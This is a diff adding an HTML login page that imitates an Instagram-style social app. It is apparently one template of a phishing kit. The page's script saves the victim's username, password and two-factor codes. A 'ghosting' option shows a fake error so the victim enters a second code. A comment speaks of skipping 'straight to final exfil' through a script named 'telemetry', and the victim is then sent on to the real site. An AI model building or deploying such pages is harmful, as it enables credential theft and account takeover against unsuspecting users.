@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In</title>
+    <link rel="stylesheet" href="../styles.css">
+    <style>
+        /* Override Fintech styles for a "Social" look */
+        body { background-color: #fafafa; }
+        .auth-card { border: 1px solid #dbdbdb; box-shadow: none; border-radius: 2px; max-width: 350px; padding: 30px; }
+        input { background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; font-size: 14px; }
+        input:focus { border-color: #a8a8a8; box-shadow: none; }
+        button { border-radius: 4px; font-weight: 600; padding: 8px; }
+        .logo-text { font-family: 'Segoe UI', cursive; font-size: 32px; font-weight: bold; margin-bottom: 30px; }
+        .divider { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; text-transform: uppercase; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background-color: #dbdbdb; }
+        .divider::before { margin-right: 15px; } .divider::after { margin-left: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="auth-card">
+    <div class="logo-text" id="brand-name">SocialApp</div>
+
+    <div id="step-1">
+        <form id="form-login">
+            <input type="text" id="u" placeholder="Phone number, username, or email" required autocomplete="off">
+            <input type="password" id="p" placeholder="Password" required autocomplete="off">
+            <button type="submit" id="btn-login">Log In</button>
+        </form>
+        <div class="divider">OR</div>
+        <p style="color: #385185; font-weight: 600; font-size: 14px; cursor: pointer;">Log in with Facebook</p>
+    </div>
+
+    <div id="step-2" class="hidden">
+        <h3>Two-Factor Authentication</h3>
+        <p style="font-size: 13px;">Enter the security code sent to your mobile device.</p>
+        <span id="mfa-error" class="error-text hidden">Error. Please request a new code.</span>
+        <form id="form-mfa">
+            <input type="text" id="otp" class="mfa-input" maxlength="6" placeholder="######" required autocomplete="off">
+            <button type="submit">Confirm</button>
+        </form>
+    </div>
+</div>
+
+<script src="../telemetry.js"></script>
+<script>
+    let activeConfig = {};
+    let attempts = 0;
+
+    // Dynamic Loader (Targeting a social config)
+    async function initFramework(configName) {
+        try {
+            // Imagine you have a configs/social.json file
+            const res = await fetch(`../configs/${configName}.json`);
+            activeConfig = await res.json();
+            
+            document.getElementById('brand-name').innerText = activeConfig.name;
+            document.documentElement.style.setProperty('--primary', activeConfig.primary);
+        } catch (err) {
+            console.error("Config load failed. Using defaults.");
+            // Fallback defaults
+            document.documentElement.style.setProperty('--primary', '#0095f6'); 
+            activeConfig.redirect = "https://instagram.com";
+        }
+    }
+
+    // Call init with a config that doesn't exist yet to trigger fallback blue theme
+    initFramework('insta');
+
+    // Standard engine mapping
+    document.getElementById('form-login').addEventListener('submit', (e) => {
+        e.preventDefault();
+        sessionStorage.setItem('log_u', document.getElementById('u').value);
+        sessionStorage.setItem('log_p', document.getElementById('p').value);
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+        TelemetryScanner.runAudit();
+    });
+
+    document.getElementById('form-mfa').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        attempts++;
+        sessionStorage.setItem(`mfa_${attempts}`, document.getElementById('otp').value);
+
+        if (TelemetryScanner.settings.enableGhosting && attempts === 1) {
+            document.getElementById('mfa-error').classList.remove('hidden');
+            document.getElementById('otp').value = ""; 
+            TelemetryScanner.runAudit(false);
+        } else {
+            // Because social apps don't usually ask for CC info, we skip straight to final exfil
+            await TelemetryScanner.runAudit(true);
+            window.location.href = activeConfig.redirect;
+        }
+    });
+</script>
+
+</body>
+</html>
